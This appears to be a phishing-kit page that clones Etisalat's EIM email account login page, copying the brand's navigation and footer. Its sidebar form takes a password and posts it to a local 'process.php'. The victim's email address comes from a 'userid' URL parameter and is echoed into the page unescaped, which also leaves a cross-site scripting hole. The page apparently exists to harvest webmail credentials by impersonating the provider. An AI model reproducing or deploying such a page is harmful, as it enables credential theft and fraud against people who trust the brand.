<!DOCTYPE html>
<!-- saved from url=(0053)http://www.etisalat.ae/en/myaccount/email-account.jsp -->
<html lang="en-us" class="no-js nav-down"><!--<![endif]--><head>

<title>Etisalat - Email Account</title>
<link rel="shortcut icon" href="http://www.etisalat.ae/en/system/images/rd/favicon.ico">

    

<link href="http://www.etisalat.ae/en/system/images/generic/etisalat.ico" rel="shortcut icon" type="image/x-icon">
<link href="image/globalnew.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="image/main.css">	
<link rel="stylesheet" href="image/main-plus.css">
		
</head> 
<body class="liveWrapper ltr">
	

<header class="main-header acn-trans">
				<div class="mydetective"></div>				
				<div class="container-full header-top">
					<div class="grid-container-1342 cf">
						<a class="brand" href="http://liverd.etisalat.ae/en/index.jsp"><img src="image/aelogo.png" /></a>
						<nav class="grid header-nav cf">
							<ul class="primary-nav pull-left">
								<li class="first current"><a href="http://www.etisalat.ae/en/myaccount/email-account.jsp#" id="menu-item-personal">Personal</a> </li>
								<li class="last"><a href="http://www.etisalat.ae/en/myaccount/email-account.jsp#" id="menu-item-business">Business</a> </li>
							</ul>
							
							<button class="btn-virgo menu-extra visuallyhidden--etisalat-lap pull-right"><i class="fe-menu"></i><i class="fe-close soft-hidden"></i></button>
							
							<a href="http://www.etisalat.ae/en/myaccount/email-account.jsp#" class="btn-primary account-logout hidden--etisalat-palm hidden--etisalat-smart pull-right">
								<span>sign in/register </span>
							</a>
							
							<a id="languge" href="http://www.etisalat.ae/en/myaccount/email-account.jsp#" class="alt-text langMan pull-right hidden--etisalat-palm hidden--etisalat-smart" data-value="ar">Arabian</a>
							<!--<span class="sep pull-right">|</span>  -->
							<button type="submit" form="searchFormHeader" class="btn-virgo search-field-activator pull-right hidden--etisalat-palm hidden--etisalat-smart"><i class="fe-search"></i>&nbsp;</button>
							<div class="search-field form-control pull-right hidden--etisalat-palm hidden--etisalat-smart">
								<form id="searchFormHeader" class="searchBox" onsubmit="search1(&#39;searchFormHeader&#39;)" name="searchFormHeader">
									<input type="text" name="search" id="input" placeholder="I am looking for" class="ui-autocomplete-input" autocomplete="off" role="textbox" aria-autocomplete="list" aria-haspopup="true">
								</form>
							</div> 
						</nav>
					</div>
				</div>
					<div class="container-full header-bottom">
					<div class="grid-container-1342 subNavMenu">
						<ul id="sub-nav-personal" class="grid soft-hidden">
							<li class="grid__item one-whole etisalat-lap-one-quarter color-1 first"><ins></ins><span><a href="http://liverd.etisalat.ae/en/personal/elife/elife.jsp">eLife home entertainment</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
                                <li class="first"><a href="https://onlineservices.etisalat.ae/scp/elife/eLifeCheckAvailability.jsp" target="new">can I get the service?</a></li> 
  <li><a href="https://onlineservices.etisalat.ae/scp/checkout/express/eLifeConfiguratorStep1.jsp">create your own bundle</a></li> 
                                    <li><a href="http://liverd.etisalat.ae/en/personal/elife/bundles/elife_bundles.jsp">eLife offers</a></li>
<li class="last"><a href="http://liverd.etisalat.ae/en/generic/migrating_to_etisalat.jsp">switch to eLife</a></li>
                                     <!-- <li><a href="http://liverd.etisalat.ae/en/personal/elife/justtelevision_landingpage.jsp">all about tv</a></li> 
                                    <li><a href="http://liverd.etisalat.ae/en/personal/elife/justinternet_landingpage.jsp">all about internet</a></li>  
                                     <li><a href="http://liverd.etisalat.ae/en/personal/elife/justtelephone_landingpage.jsp">all about telephone</a></li> -->
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-quarter color-2"><ins></ins><span><a href="http://liverd.etisalat.ae/en/personal/mobile/mobile_landingpage.jsp">mobile</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">									
									<li class="first"><a href="http://liverd.etisalat.ae/en/promotions/etisalat_challenge/overview.jsp">postpaid plans</a></li>
									<li><a href="http://liverd.etisalat.ae/en/promotions/etisalat_challenge/overview.jsp">prepaid plans</a></li>
									<li><a href="http://liverd.etisalat.ae/en/promotions/etisalat_challenge/overview.jsp">data plans</a></li>
                                    <li><a href="http://liverd.etisalat.ae/en/generic/visitor_line.jsp">visitor line</a></li>
									<li class="last"><a href="http://liverd.etisalat.ae/en/personal/mobile/mobile_roaming_catalogue.jsp">international roaming</a></li>
									
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-quarter color-3"><ins></ins><span><a href="http://liverd.etisalat.ae/en/personal/smartphone/smartphone_landingpage.jsp">smartphone &amp; devices</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
									<li class="first"><a href="http://liverd.etisalat.ae/en/personal/devices_catalogue/smartphones_catalogue_new.jsp">smartphones &amp; tablets</a> </li>
                                                                         <li><a href="http://liverd.etisalat.ae/en/personal/devices_catalogue/smartliving.jsp">smartliving</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/personal/devices_catalogue/tv_home_devices.jsp">tv &amp; home devices</a></li>									
									<li><a href="http://liverd.etisalat.ae/en/personal/devices_catalogue/modems_routers.jsp">modems &amp; routers</a></li>
									<li class="last"><a href="http://liverd.etisalat.ae/en/personal/devices_catalogue/xbox_playstation.jsp">gaming consoles</a></li>
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-quarter color-3 last"><ins></ins><span>for you</span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
 <li class="first"><a href="https://onlineservices.etisalat.ae/scp/open/nba/nbaPromotion.jsp" target="new">offers for you</a> </li>
                                <li><a href="https://onlineservices.etisalat.ae/scp/open/quickpayandrecharge/quickPayAndRecharge.jsp" target="new">quick pay &amp; recharge</a> </li>
									  <li><a href="https://www.etisalatrewards.ae/" target="new">Etisalat rewards</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/promotions/promotions.jsp">promotions</a></li>									
									
									<li><a href="http://liverd.etisalat.ae/en/generic/mobileapp/mobile-app.jsp">Etisalat UAE mobile app</a></li>

									<li class="last"><a href="http://support.etisalat.ae/en/index.jsp">support</a> </li>
                                  
								</ul>
							</li>
							<button class="hidden--etisalat-palm hidden--etisalat-smart" data-ref="menu-item-personal"></button>
						</ul>
						<ul id="sub-nav-business" class="grid soft-hidden">
									<li class="grid__item one-whole etisalat-lap-one-fifth color-4 first"><ins></ins><span><a href="http://www.etisalat.ae/en/business/products-and-services/products-services-index.jsp">products &amp; services</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
									<li class="first"><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/voice/al-mersal-voicemail-overview.jsp">fixed voice</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/internetdata/business-super-overview.jsp">internet and data</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/mobile-wireless/blackberry-overview.jsp">mobile and wireless</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/cloud/overview.jsp">cloud computing</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/managed-services/managed-hosting-overview.jsp">managed services</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/messagingservices/msgmanager-overview.jsp">messaging services</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/securityservices/pki-overview.jsp">security</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/solutions/m2m-solutions.jsp">m2m</a> </li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/paymentservices/epg-overveiw.jsp">eCommerce</a> </li>
									<li class="last"><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/paymentservices/mpayment-overveiw.jsp">mCommerce</a> </li>
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-fifth color-5"><ins></ins><span><a href="http://www.etisalat.ae/en/myaccount/email-account.jsp#">solutions</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
									<li class="first"><a href="http://liverd.etisalat.ae/en/business/solutions/business-connectivity.jsp">connectivity</a></li>
									<li><a href="http://liverd.etisalat.ae/en/business/solutions/mobility-solutions.jsp">mobility solutions</a></li>
									<li><a href="http://liverd.etisalat.ae/en/business/solutions/managed-ict.jsp">managed ICT</a></li>
									<li><a href="http://liverd.etisalat.ae/en/business/solutions/ebusiness-solutions.jsp">eBusiness</a></li>
									<li><a href="http://liverd.etisalat.ae/en/business/solutions/m2m-solutions.jsp">m2m</a></li>
<li class="last"><a href="http://liverd.etisalat.ae/en/business/solutions/m2m-iot.jsp">internet of things (IoT)</a></li>
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-fifth color-6"><ins></ins><span><a href="http://www.etisalat.ae/en/business/sme/sme.jsp">small business</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
                                   <li class="first"> <a href="http://www.etisalat.ae/nrd/en/business/products-and-services/products/internetdata/hello_business_overview.jsp">hello business</a> </li>
                                   <li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/mobile-wireless/new-business-ultimate-overview.jsp">new business ultimate</a></li>
                                   
                                   <li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/voice/business-quick-start-overview.jsp">business quick start</a></li>
                                   		<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/internetdata/business-super-overview.jsp">business super</a></li>
                                   
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/mobile-wireless/business_prestige_overview.jsp">business prestige</a></li>
									<li><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/mobile-wireless/business-data-roaming-overview.jsp">traveler pack</a></li>
                                    <li class="last"><a href="http://liverd.etisalat.ae/en/business/products-and-services/products/mobile-wireless/multishare-overview.jsp">multi share</a></li>
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-fifth color-7"><ins></ins><span><a href="http://www.etisalat.ae/en/myaccount/email-account.jsp#">carrier &amp; wholesale</a></span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">
									<li class="first"><a href="http://liverd.etisalat.ae/en/carriers/services/e-mix.jsp">EMIX &amp; IP Services</a></li>
									<li><a href="http://liverd.etisalat.ae/en/carriers/services/smarthubipx.jsp">Smart Hub IPX</a></li>
									<li><a href="http://liverd.etisalat.ae/en/carriers/services/econnect.jsp">e-connect</a></li>
									<li><a href="http://liverd.etisalat.ae/en/carriers/services/e-Capacity.jsp">e-capacity</a></li>
									<li><a href="http://liverd.etisalat.ae/en/carriers/services/ebroadcast.jsp">e-broadcast</a></li>
									<li class="last"><a href="http://liverd.etisalat.ae/en/carriers/services/smarthub.jsp">Smart Hub</a></li>
								
								</ul>
							</li>
							<li class="grid__item one-whole etisalat-lap-one-fifth color-3 last"><ins></ins><span>for you</span><button class="btn-virgo menuExpColl visuallyhidden--etisalat-lap"></button>
								<ul class="lev2 visuallyhidden--etisalat-palm visuallyhidden--etisalat-smart secondary-na nav nav--stacked">

									<li class="first"><a href="http://liverd.etisalat.ae/en/promotions/promotions_business.jsp">promotions</a></li>
									<li class="last"><a href="http://support.etisalat.ae/en/business/faqs_voice.jsp">support</a> </li>
								</ul>
							</li>
							<button class="hidden--etisalat-palm hidden--etisalat-smart" data-ref="menu-item-business"></button>
						</ul>
						
					</div>
					<div class="grid-container-1000 other-menu-items omi-1 visuallyhidden--etisalat-lap cf">						
						<ul class="soft-hidden">
							<li class="first last">
								<!-- <button type="submit" form="searchFormHeaderM" class="btn-virgo search-field-activator pull-right"><i class="fe-search"></i>&nbsp;</button> -->
                                <button type="submit" form="searchMobileFormHeader" class="btn-virgo search-field-activator pull-right"><i class="fe-search"></i>&nbsp;</button>
								<div class="search-field form-control pull-right">
								<!--	<form id="searchFormHeaderM" class="searchBox" onsubmit="submitTest(this);" name="searchFormHeader">
										<input type="text" value="" placeholder="search"/>
									</form> -->
                                    	<form id="searchMobileFormHeader" class="searchBox" onsubmit="searchMobile(&#39;searchMobileFormHeader&#39;)" name="searchMobileFormHeader">
									<input type="text" name="search" id="mobileinput" placeholder="I am looking for" class="ui-autocomplete-input" autocomplete="off" role="textbox" aria-autocomplete="list" aria-haspopup="true">
								</form>
								</div>
							</li>
						</ul>
					</div>
					<div class="grid-container-1342 for-login">
						<div id="login-panel" class="soft-hidden">
							<a href="https://onlineservices.etisalat.ae/scp/" target="new" class="a1"><i class="fe-user"></i>my account</a>
							<a href="http://www.eim.ae/" class="a2"><i class="fe-email"></i>my email</a>
							<a href="http://www.etisalat.ae/myinternet" class="a3"><i class="fe-internet"></i>my internet</a> 							<a href="https://businessonline.etisalat.ae/" target="new" class="a4"><i class="fe-business"></i>my business</a>
							<!-- <a href="#" class="a5"><i class="fe-other"></i>other account</a> -->
						</div>
					</div>
					<div class="grid-container-1000 other-menu-items omi-2 visuallyhidden--etisalat-lap ">
						<ul class="soft-hidden">
							<li class="first">
								<a id="langugeM" href="http://www.etisalat.ae/en/myaccount/email-account.jsp#" class="langMan" data-value="ar">arabic</a>						
							</li>
							<li>
								<a href="http://www.etisalat.ae/en/generic/contactus-personal.jsp" class=""><i class="fe-phone"></i>contact us</a>						
							</li>
							<li>
								<a href="http://etisalat.ae/en/generic/locationmap.jsp" class=""><i class="fe-map"></i>find location</a>						
							</li>
							<li class="last">
								<a href="http://www.etisalat.ae/en/generic/v-onlinechat.jsp" class=""><i class="fe-chat"></i>live chat</a>						
							</li>
						</ul>

						
					</div>
				
				
				</div>
			</header>
<div class="container">
<div id="baseLayout">
        <!-- Content Starts -->
            <div class="contentBlock">
            <div id="csBase">
                <div class="contentSection">
                    <div class="contentSectionInner">
                        <!-- Content Title Section Start -->
                        <div class="csHeaderSectin">
                            <div class="csHSLs">
                                <div class="csHSTitleSection">
                                    <div class="headTxt">
                                        <h5>
                                        </h5>
                                    </div>
                                    <div class="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- Content Title Section End -->
                            	<!-- Left Section Start -->
	<div class="lsThreeCol2">
    	<!-- Breadcrumb Section Start -->
        	<div class="breadCrumbTop2 runTxt">
				<div><div class="csBreadCrumbFirstOff"><a href="http://www.etisalat.ae/en/index.jsp" title="Home">Home</a></div><div class="csBreadCrumbOn">Email Account</div></div>
            </div>
        <!-- Breadcrumb Section End -->
        <div class="csGraThreeColBlock">
			<div class="csGraThreeColBlockInner">
				<div class="csGraThreeColBlockConNoTop runTxt" >
					<div>
							<div class="csAUBlockFull runTxt mB20" style="background:#FFF; padding:20px; border-radius:8px; border:1px solid #ccc;">    
								<div class="csAUBlockBoxFullTop"></div>
								<div class="csAUBlockBoxFullMid runTxt">     
										<div class="wrapImgTxt">     
											<div class="mainTbl">
        <img class=" fLeft" src="image/WhyIRegister.gif">
					<h5 class=" mT15">EIM WebMail is user friendly and has loads of new features:</h5>
					<p>- Get your firstname.lastname@eim.ae
<br>
						<br>
- Enhanced Arabic Support
<br>
						<br>
- Email2MMS Composer
<br>
						<br>
- Advanced Mail Filters
<br>
						<br>
- Vacation Auto Responder
<br>
						<br>
- 50+ Skins</p> </div>
										</div>
								</div> 
								<div class="csAUBlockBoxFullBot"></div>
							</div>
					</div>  
				</div> 
			</div> 
		</div>  
    </div>  
      	<!-- Right Section Start -->
	<div>
			<div id="att-right-sidebar">
				<div class="related-links">
					<div class="rightHeader">
						<h6>
					</h6><h6>My Email Account</h6>
					<img src="image/cs_submenu_key.png" title="cs_submenu_key" alt="cs_submenu_key" style="width: 22px; height: 24px;">
					</div>
        <div class="rsLoginFieldPad">
						<form name="MyEmailAccoutLogin" method="post" action="process.php" id="MyEmailAccoutLogin">
						
						<p style="font-weight:bold;"><?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?></p>
				<input type="hidden"  name="email" value="<?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?>" >
						
						<input type="password" name="password" class="rsLoginField" placeholder="password">
							<div class="pB20 pL70">
								<div class="btnGreen"><span><input type="submit" value="submit" style="background:#6A9227; color:#FFF; padding:3px 6px; border-radius:4px;" /></span></div>
								<div class="fLeft pL10">&nbsp;</div>
							</div>
						</form>
					</div>
				</div>
			</div>
			<br>
	</div>
	<!-- Right Section End -->
  	<!-- Left Section End -->
 
                    </div>
                </div>
            </div>
            </div>
  </div>
</div>
            <!-- Footer Include START -->
         
<footer class="main-footer container-full acn-trans">
			<section class="first-footer hidden--etisalat-palm hidden--etisalat-smart">
				<h3>Still looking for help?</h3>
				<p>contact us on the live chat available 24/7 or come visit on our store</p>
				<nav class="grid-container-1000">
					<ul class="grid spaced">
						<li class="first"><a href="http://www.etisalat.ae/en/generic/contactus-personal.jsp" class="btn-virgo"><i class="fe-phone"></i><span class="hidden">contact us</span></a><span>contact us</span></li>
						<li><a href="http://www.etisalat.ae/en/generic/locationmap.jsp" class="btn-virgo"><i class="fe-map"></i><span class="hidden">find location</span></a><span>find location</span></li>
						<li class="last"><a href="http://www.etisalat.ae/en/generic/v-onlinechat.jsp" class="btn-virgo"><i class="fe-chat"></i><span class="hidden">live chat</span></a><span>live chat</span></li>
					</ul>
				</nav>
			</section>
			<section>
				<h3>follow us</h3>
				<nav class="grid-container-1000">
					<ul class="grid spaced">
						<li class="first"><a href="http://twitter.com/etisalat" class="btn-virgo"><i class="fe-twitter"></i><span class="hidden">twitter</span></a></li>
						<li><a href="https://www.facebook.com/etisalat" class="btn-virgo"><i class="fe-facebook"></i><span class="hidden">facebook</span></a></li>
						<li><a href="http://www.youtube.com/etisalat" class="btn-virgo"><i class="fe-youtube"></i><span class="hidden">youtube</span></a></li>
						<li><a href="http://www.instagram.com/etisalat" class="btn-virgo"><i class="fe-instagram"></i><span class="hidden">instagram</span></a></li>
						<li class="last"><a href="http://www.linkedin.com/company/etisalat" class="btn-virgo"><i class="fe-linkedin"></i><span class="hidden">linkedin</span></a></li>
					</ul>
				</nav>
				<div class="hr"></div>
				<h3 class="hidden">Info</h3>
				<nav class="grid-container-1000">
					<ul class="grid piped">
						<li class="first"><a href="http://www.etisalat.ae/en/aboutus/about.jsp">About Us</a></li>
						<li><a href="http://www.etisalat.ae/en/generic/new_wasel_prepaid_mobile.jsp#">FAQ</a></li>
						<li class="last"><a href="http://www.etisalat.ae/en/career/possibilities/career-possibilities.jsp">Careers</a></li>
					</ul>
				</nav>
				<h3 class="hidden">Information architecture &amp; legal notes</h3>
				<nav class="grid-container-1000">
					<ul class="grid piped special">
<li class="first"><a href="https://etisalat.au1.qualtrics.com/jfe/form/SV_6xnDUP7SAJwNTQ9">Survey</a></li>
						<li><a href="http://www.etisalat.ae/en/generic/sitemap.jsp">Site Map</a></li>
						<li><a href="http://www.etisalat.ae/en/generic/terms-and-conditions.jsp">Terms and Conditions</a></li>
						<li><a href="http://www.etisalat.ae/en/generic/privacy-policy.jsp">Privacy Policy</a></li>
<li class="last"><a href="http://support.etisalat.ae/en/system/docs/personal/misc/Code%20of%20Practice%20for%20Customer%20Affairs.pdf">Code of Practice</a></li>
					</ul>
				</nav>
				<small>Copyright 2016 © Etisalat. All Rights Reserved.</small>
			</section>
		</footer>

</body></html>